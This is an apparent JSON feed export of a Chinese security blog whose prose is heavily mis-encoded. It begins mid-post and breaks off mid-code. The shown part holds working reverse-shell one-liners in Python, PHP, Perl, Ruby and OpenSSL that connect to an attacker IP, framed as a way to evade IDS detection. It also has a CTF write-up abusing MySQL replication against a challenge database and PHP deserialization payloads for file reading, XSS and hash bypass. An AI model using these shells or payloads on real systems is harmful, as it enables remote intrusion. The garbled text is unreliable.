‡ä¸»æœºä¸Šæœ‰ python ç¯å¢ƒæ—¶ï¼Œå¯ä»¥ç”¨ python æ¥åå¼¹ shell<br>\n æ”»å‡»æœº:   nc -lvnp 2333<br>\n ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.81.122&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"phpè„šæœ¬åå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#phpè„šæœ¬åå¼¹shell\">#</a> php è„šæœ¬åå¼¹ shell</h4>\n<p>ç›®æ ‡æœºä¸»åŠ¨è¿æ¥:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.81.122&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"perlè„šæœ¬åå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#perlè„šæœ¬åå¼¹shell\">#</a> Perl è„šæœ¬åå¼¹ shell</h4>\n<p>ç›®æ ‡æœº:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e &#x27;use Socket;$i=&quot;192.168.81.122&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"rubyè„šæœ¬åå¼¹shell\"><a class=\"markdownIt-Anchor\" href=\"#rubyè„šæœ¬åå¼¹shell\">#</a> Ruby è„šæœ¬åå¼¹ shell</h4>\n<p>ç›®æ ‡æœº:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class=\"line\">æˆ–</span><br><span class=\"line\">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>\n<h4 id=\"metasploitç”Ÿäº§åå¼¹shellçš„ä¸€å¥è¯\"><a class=\"markdownIt-Anchor\" href=\"#metasploitç”Ÿäº§åå¼¹shellçš„ä¸€å¥è¯\">#</a> Metasploit ç”Ÿäº§åå¼¹ shell çš„ä¸€å¥è¯</h4>\n<p>å½“æˆ‘ä»¬å¿˜è®°å‰é¢çš„è¯­å¥æ—¶å¯ä»¥ç”¨ metasploit æ¥ç”Ÿæˆ<br>\n <code>msfvenom -l payloads | grep 'cmd/unix/reverse'</code></p>\n<p>æ¯”å¦‚æˆ‘ä»¬ç”Ÿäº§ä¸€ä¸ª python çš„:</p>\n<p><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.81.122 LPORT=2333 -f raw</code></p>\n<h3 id=\"åå¼¹shellåè·å–æ¨¡æ‹Ÿç»ˆç«¯\"><a class=\"markdownIt-Anchor\" href=\"#åå¼¹shellåè·å–æ¨¡æ‹Ÿç»ˆç«¯\">#</a> åå¼¹ shell åè·å–æ¨¡æ‹Ÿç»ˆç«¯</h3>\n<p>æ­¤æ—¶è·å¾—çš„ shell ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒï¼Œäº¤äº’æ€§éå¸¸å·®ï¼Œvim å’Œ sudo è¿™ç§æ“ä½œéƒ½åšä¸äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å€ŸåŠ© python çš„ pty åº“æ¥è·å–ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒ.</p>\n<p>åœ¨è·å–çš„ shell é‡Œè¾“å…¥:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"opensslåå¼¹åŠ å¯†shell\"><a class=\"markdownIt-Anchor\" href=\"#opensslåå¼¹åŠ å¯†shell\">#</a> OpenSSL åå¼¹åŠ å¯† shell</h3>\n<p>ä¸Šæ–‡çš„åå¼¹ shell æ–¹æ³•çš„æ‰€æœ‰çš„æµé‡éƒ½æ˜¯<mark>æ˜æ–‡ä¼ è¾“çš„</mark>ï¼Œè¿™äº›é€šè¿‡ shell ä¼ è¾“çš„æµé‡éƒ½èƒ½è¢«ç®¡ç†å‘˜ç›´æ¥æŠ“å–å’Œç†è§£ï¼Œè‹¥ç›®æ ‡ä¸»æœºæœ‰ç½‘ç»œé˜²å¾¡æ£€æµ‹ç³»ç»Ÿ (IDS,IPS ç­‰), ä¼šæŠŠæˆ‘ä»¬çš„é€šä¿¡å†…å®¹è¿›è¡Œå‘Šè­¦å’Œé˜»æ­¢ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹é€šä¿¡çš„å†…å®¹è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œé¿å…çªƒå¬ï¼ŒåŒæ—¶ç¡®è®¤å¦ä¸€ç«¯è¿æ¥ç€çš„èº«ä»½</p>\n<h4 id=\"opensslç®€å†\"><a class=\"markdownIt-Anchor\" href=\"#opensslç®€å†\">#</a> OpenSSL ç®€å†</h4>\n<p>å®ƒæ—¶ä¸€ä¸ªå¼€å‘æºä»£ç çš„è½¯ä»¶åŒ…åº“ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨è¿™ä¸ªåŒ…æ¥è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œé¿å…çªƒå¬ï¼ŒåŒæ—¶ç¡®å®šå¦ä¸€ç«¯è¿æ¥è€…çš„èº«ä»½<br>\nä½¿ç”¨å‰éœ€è¦å…ˆç”Ÿäº§è‡ªç­¾åè¯ä¹¦:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>\n<h4 id=\"ä½¿ç”¨opensslåå¼¹åŠ å¯†shell\"><a class=\"markdownIt-Anchor\" href=\"#ä½¿ç”¨opensslåå¼¹åŠ å¯†shell\">#</a> ä½¿ç”¨ OpenSSL åå¼¹åŠ å¯† shell</h4>\n<p>æ”»å‡»æœº:<br>\n é¦–å…ˆéœ€è¦åˆ©ç”¨ä¸Šä¸€æ­¥ç”Ÿæˆçš„è‡ªç­¾åè¯ä¹¦</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶çš„ Open SSL åœ¨æ”»å‡»æœºçš„ 2333 ç«¯å£å¯åŠ¨äº†ä¸€ä¸ª SSL/TLS server<br>\n ç›®æ ‡æœº:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.81.122:2333 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>\n<p>ç»“æœ:<br>\n<img data-src=\"https://s2.loli.net/2023/06/21/uj6WzPMqKcikZFh.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 214152.png\"></p>\n<p><img data-src=\"https://s2.loli.net/2023/06/21/kwKvQHPf372FuGy.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-21 214142.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "url": "https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/",
            "title": "Mysqlä¸»ä»å¤åˆ¶",
            "date_published": "2023-06-21T03:09:09.169Z",
            "content_html": "<h2 id=\"åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†\">#</a> åŸç†</h2>\n<p>ç®€å•è¯´å°±æ˜¯ä¸»æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„è¯­å¥ï¼Œä»æœåŠ¡å™¨ä¹Ÿæ‰§è¡Œäº†ç›¸åŒçš„è¯­å¥ï¼Œä¸»æœåŠ¡å™¨çš„æ“ä½œåœ¨ä»æœåŠ¡å™¨ä¸Šäº§ç”Ÿäº†ç›¸åŒçš„æ•ˆæœ</p>\n<p>è¿‡ç¨‹ï¼š</p>\n<ul>\n<li>masterï¼ˆä¸»æ•°æ®åº“ï¼‰å°†ç”¨æˆ·å¯¹æ•°æ®åº“çš„æ›´æ–°æ“ä½œä»¥äºŒè¿›åˆ¶æ ¼å¼ä¿å­˜è¿› BinaryLog æ—¥å¿—æ–‡ä»¶ä¸­</li>\n<li>slave (ä»æ•°æ®åº“) çš„ I/O è¿›ç¨‹è¯»å–ä¸»æ•°æ®åº“çš„äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶</li>\n<li>slave å°†æ¥æ”¶åˆ°çš„æ—¥å¿—å†…å®¹æ·»åŠ åˆ° relay-kogï¼Œä»æ•°æ®åº“çš„ SQL è¿›ç¨‹æ£€æµ‹æ–°çš„æ—¥å¿—å†…å®¹è§£æå¹¶æ‰§è¡Œ</li>\n</ul>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20201102143527123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzg2Mjg1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"å›¾ç‰‡\"></p>\n<h2 id=\"é…ç½®\"><a class=\"markdownIt-Anchor\" href=\"#é…ç½®\">#</a> é…ç½®</h2>\n<p>masterï¼š192.168.81.122(kali)<br>\nslaveï¼š192.168.81.113(ubuntu)</p>\n<h3 id=\"masteré…ç½®\"><a class=\"markdownIt-Anchor\" href=\"#masteré…ç½®\">#</a> Master é…ç½®ï¼š</h3>\n<p>å‘½ä»¤è¡Œè¿›å…¥ MySQL:<br>\n <code> mysql -u root -p</code> <br>\n æ¥ç€è¾“å…¥å¯†ç ï¼Œç„¶ååˆ›å»ºç”¨æˆ·ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//rootå’Œrootæ˜¯ä»æœåŠ¡å™¨å™¨(slave)çš„æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç </span><br><span class=\"line\">GRANT REPLICATION SLAVE ON *.* to &#x27;root&#x27;@&#x27;192.168.81.113&#x27; identified by &#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//åˆ·æ–°ç³»ç»Ÿæƒé™è¡¨çš„é…ç½®</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure>\n<p>æ‰¾åˆ° mysql çš„é…ç½®æ–‡ä»¶ /etc/my.conf, å¢åŠ ä»¥ä¸‹é…ç½®</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#å¼€å¯binlog</span><br><span class=\"line\">log-bin=mysql-bin</span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">#éœ€è¦åŒæ­¥çš„æ•°æ®åº“,å¦‚æœä¸é…ç½®åˆ™åŒæ­¥æ‰€ä»¥æ•°æ®åº“</span><br><span class=\"line\">binlog-do-db=mysql_test</span><br><span class=\"line\">#binlogæ—¥å¿—ä¿ç•™çš„å¤©æ•°</span><br><span class=\"line\">expire-logs-days=10</span><br></pre></td></tr></table></figure>\n<p>é…ç½®å®Œæˆåé‡å¯ mysql:<br>\nservice mysql restart<br>\n æŸ¥çœ‹å½“å‰ binlog æ—¥å¿—çš„ä¿¡æ¯<br>\n <code>show master status\\G</code></p>\n<p>mysql-bin.000002</p>\n<h3 id=\"slaveé…ç½®\"><a class=\"markdownIt-Anchor\" href=\"#slaveé…ç½®\">#</a> slave é…ç½®</h3>\n<p>æ‰¾åˆ° /etc/my.cnf é…ç½®æ–‡ä»¶ï¼Œå¢åŠ ä»¥ä¸‹é…ç½®:<br>\n <code>server-id=2</code> <br>\n æ¥ç€ç”¨å‘½ä»¤è¡Œç™»å½•åˆ° mysql æœåŠ¡å™¨:<br>\n <code>mysql -u root -p</code> <br>\n è¿›å…¥ MySQL åè¾“å…¥ä»¥ä¸‹å‘½ä»¤:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO </span><br><span class=\"line\">MASTER_HOST=&#x27;192.168.81.122&#x27;,//ä¸»æœºIP</span><br><span class=\"line\">MASTER_USER=&#x27;root&#x27;,//ä¹‹å‰åˆ›å»ºçš„ç”¨æˆ·è´¦å·</span><br><span class=\"line\">MASTER_PASSWORD=&#x27;root&#x27;,//ä¹‹å‰åˆ›å»ºçš„ç”¨æˆ·å¯†ç </span><br><span class=\"line\">MASTER_LOG_FILE=&#x27;mysql-bin.000002&#x27;,//masterä¸»æœºçš„binlogæ—¥å¿—åç§°</span><br><span class=\"line\">MASTER_LOG_POS=862,//binlogæ—¥å¿—åç§»é‡</span><br><span class=\"line\">master_port=3306;//ç«¯å£</span><br></pre></td></tr></table></figure>\n<p>å¯åŠ¨ slave æœåŠ¡:<br>\n <code>start slave;</code> <br>\n æŸ¥çœ‹æ˜¯å¦å¯åŠ¨æˆåŠŸ:<br>\n <code>show slave status\\G</code></p>\n<h2 id=\"æµ‹è¯•ä¸»ä»å¤åˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#æµ‹è¯•ä¸»ä»å¤åˆ¶\">#</a> æµ‹è¯•ä¸»ä»å¤åˆ¶</h2>\n<p>åœ¨ maser ä¸»æœºæ‰§è¡Œ:</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `tb_commodity_info` (</span><br><span class=\"line\">  `id` varchar(32) NOT NULL,</span><br><span class=\"line\">  `commodity_name` varchar(512) DEFAULT NULL COMMENT &#x27;å•†å“åç§°&#x27;,</span><br><span class=\"line\">  `commodity_price` varchar(36) DEFAULT &#x27;0&#x27; COMMENT &#x27;å•†å“ä»·æ ¼&#x27;,</span><br><span class=\"line\">  `number` int(10) DEFAULT &#x27;0&#x27; COMMENT &#x27;å•†å“æ•°é‡&#x27;,</span><br><span class=\"line\">  `description` varchar(2048) DEFAULT &#x27;&#x27; COMMENT &#x27;å•†å“æè¿°&#x27;,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;å•†å“ä¿¡æ¯è¡¨&#x27;;</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶çœ‹ä»æ•°æ®åº“çš„ç»“æ„</p>\n<h2 id=\"ä¾‹é¢˜2023å®‰æ´µæ¯-confronting-robots\"><a class=\"markdownIt-Anchor\" href=\"#ä¾‹é¢˜2023å®‰æ´µæ¯-confronting-robots\">#</a> ä¾‹é¢˜ï¼š2023 å®‰æ´µæ¯ Confronting robots</h2>\n<p>å‰é¢éƒ½èƒ½ç”¨ sqlmap æ‰«å‡ºæ¥ç›´æ¥åˆ°æœ€åä¸€æ­¥ä¸»ä»å¤åˆ¶<br>\næŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ï¼š<br>\nselect version();<br>\n åœ¨è‡ªå·± vps ä¸Šèµ·ä¸€ä¸ªç›¸åŒç‰ˆæœ¬çš„ mariadbï¼Œä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ vim /etc/mysql/my.cnf å…è®¸è¿œç¨‹è®¿é—®å¹¶å¯ç”¨äºŒè¿›åˆ¶æ—¥å¿—<br>\n server-id = 1 log_bin = /var/log/mysql/mariadb-bin<br>\nservice mysql restart<br>\n è‡ªå·±çš„ vps ä½œä¸ºä¸»ï¼Œé¢˜ç›®ç¯å¢ƒä½œä¸ºä»<br>\nä¸»æœåŠ¡å™¨æ‰§è¡Œ<br>\n CREATE USER â€˜atestâ€™@â€™%â€™ IDENTIFIED BY â€˜testtestâ€™;<br>\ngrant replication slave on . to â€˜atestâ€™@â€™%â€™;<br>\nflush privileges; ä½¿ç”¨ select database (); show tables; desc game; ç­‰æŸ¥è¯¢å‘½ä»¤å°†ä»æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ç»“æ„ä¸€æ¯”ä¸€å¤åˆ»åˆ°<br>\nä¸»æœåŠ¡å™¨ä¸Š CREATE DATABASE IF NOT EXISTS game_data;<br>\nuse game_data<br>\nCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;<br>\n åœ¨ä¸»æœåŠ¡å™¨ mysql ä¸­æ‰§è¡Œ show master status; è®°å½•ä¸‹æ¥ File å’Œ Position mysql-bin.000001 1376<br>\n åœ¨ä»æœåŠ¡å™¨ (é¢˜ç›®ç¯å¢ƒ) å‘½ä»¤æ¡†ä¸­è¾“å…¥<br>\n CHANGE MASTER TO MASTER_HOST=â€˜ä¸»æœåŠ¡å™¨ ipâ€™, MASTER_USER=â€˜atestâ€™,<br>\nMASTER_PASSWORD=â€˜testtestâ€™, MASTER_LOG_FILE=â€˜mariadb-bin.000001 (è®°å½•çš„å€¼)â€™,MASTER_LOG_POS=1365 (è®°å½•çš„å€¼);<br>\nstart slave;<br>\nshow slave status;<br>\n æ˜¾ç¤ºè¿™ä¸ªè¡¨ç¤ºæˆåŠŸè¿æ¥ä¸Š<br>\nä¸»æœåŠ¡å™¨ä¸­æ‰§è¡Œ<br>\n INSERT INTO game (round , choice) VALUES (â€˜1â€™, â€˜Râ€™), (â€˜2â€™, â€˜Râ€™),(â€˜3â€™, â€˜Râ€™), (â€˜4â€™, â€˜Râ€™),(â€˜5â€™, â€˜Râ€™), (â€˜6â€™, â€˜Râ€™),(â€˜7â€™,â€˜Râ€™), (â€˜8â€™, â€˜Râ€™),(â€˜9â€™, â€˜Râ€™), (â€˜10â€™, â€˜Râ€™);</p>\n<p>åœ¨å¼€å§‹æŒ‘æˆ˜å¤„è¾“å…¥å¯¹åº”çš„ç­”æ¡ˆå¾—åˆ° flag</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "åŸç”Ÿç±»ååºåˆ—åŒ–å­¦ä¹ ",
            "date_published": "2023-06-08T15:01:57.675Z",
            "content_html": "<p>å½“æœ‰ååºåˆ—åŒ–ç‚¹ä½†æ˜¯æ‰¾ä¸åˆ°ååºåˆ—åŒ–ç±»æ—¶ï¼Œå¯ä»¥è€ƒè™‘ç”¨ä¸€äº›åŸç”Ÿç±»</p>\n<h3 id=\"ä¸€ç›®å½•éå†ç±»\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€ç›®å½•éå†ç±»\">#</a> ä¸€ã€‚ç›®å½•éå†ç±»</h3>\n<h4 id=\"1directoryiterator\"><a class=\"markdownIt-Anchor\" href=\"#1directoryiterator\">#</a> 1.DirectoryIterator</h4>\n<p>è¿™ä¸ªç±»ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨å½“é‡åˆ° <code>echo</code>  è¾“å‡ºæ—¶ä¼šè§¦å‘ <code>Directorylterator</code>  ä¸­çš„ <code>__toString()</code>  æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åã€‚</p>\n<p>å¯ä»¥ç»“åˆ glob åè®®ä½¿ç”¨</p>\n<h4 id=\"2filesystemiterator\"><a class=\"markdownIt-Anchor\" href=\"#2filesystemiterator\">#</a> 2.FilesystemIterator</h4>\n<p>è¯¥ç±»ç»§æ‰¿äº <code>Directorylterator</code> ï¼Œæ‰€ä»¥åœ¨ç”¨æ³•ä¸ŠåŸºæœ¬ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>\n<h4 id=\"3globiterator\"><a class=\"markdownIt-Anchor\" href=\"#3globiterator\">#</a> 3.GlobIterator</h4>\n<p>é€šè¿‡ç±»åä¹Ÿä¸éš¾çœ‹å‡ºï¼Œè¿™æ˜¯ä¸ªè‡ªå¸¦ <code>glob</code>  åè®®çš„ç±»ï¼Œæ‰€ä»¥è°ƒç”¨æ—¶å°±ä¸å¿…å†åŠ ä¸Š <code>glob://</code>  äº†</p>\n<h3 id=\"äºŒæ–‡ä»¶è¯»å–ç±»\"><a class=\"markdownIt-Anchor\" href=\"#äºŒæ–‡ä»¶è¯»å–ç±»\">#</a> äºŒã€‚æ–‡ä»¶è¯»å–ç±»</h3>\n<h4 id=\"1splfileobjectç±»\"><a class=\"markdownIt-Anchor\" href=\"#1splfileobjectç±»\">#</a> 1.SplFileObject ç±»</h4>\n<p>å½“ç”¨æ–‡ä»¶ç›®å½•éå†åˆ°äº†æ•æ„Ÿæ–‡ä»¶æ—¶ï¼Œå¯ä»¥ç”¨ <code>SplFileObject</code>  ç±»ï¼ŒåŒæ ·é€šè¿‡ echo è§¦å‘ <code>SplFileObject</code>  ä¸­çš„ <code>__toString()</code>  æ–¹æ³•ã€‚(è¯¥ç±»ä¸æ”¯æŒé€šé…ç¬¦ï¼Œæ‰€ä»¥å¿…é¡»å…ˆè·å–åˆ°å®Œæ•´æ–‡ä»¶åç§°æ‰è¡Œ)</p>\n<p>é™¤æ­¤ä¹‹å¤–å…¶å® <code>SplFileObject</code>  ç±»ï¼Œåªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œå¦‚æœæƒ³è¦å…¨éƒ¨è¯»å–å°±éœ€è¦ç”¨åˆ° foreach å‡½æ•°ï¼Œä½†è‹¥é¢˜ç›®ä¸­æ²¡æœ‰ç»™å‡º foreach å‡½æ•°çš„è¯ï¼Œå°±è¦ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶çš„å†…å®¹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/1.php?a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>\n<h3 id=\"ä¸‰errorexceptionerrorexceptionç±»\"><a class=\"markdownIt-Anchor\" href=\"#ä¸‰errorexceptionerrorexceptionç±»\">#</a> ä¸‰.Error/Exception/ErrorException ç±»</h3>\n<h4 id=\"1è§¦å‘xss\"><a class=\"markdownIt-Anchor\" href=\"#1è§¦å‘xss\">#</a> 1. è§¦å‘ xss</h4>\n<p>è¿™ä¸ªç±»é‡Œæœ‰ toString æ–¹æ³•ï¼Œå¤ç°ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);  </span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ\"><a class=\"markdownIt-Anchor\" href=\"#2ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ\">#</a> 2. ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;payload&quot;</span>,<span class=\"number\">1</span>);<span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;payload&quot;</span>,<span class=\"number\">2</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$a</span>!=<span class=\"variable\">$b</span>)&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$a</span>!=<span class=\"subst\">$b</span>&quot;</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>)===<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;md5ç›¸ç­‰&quot;</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span 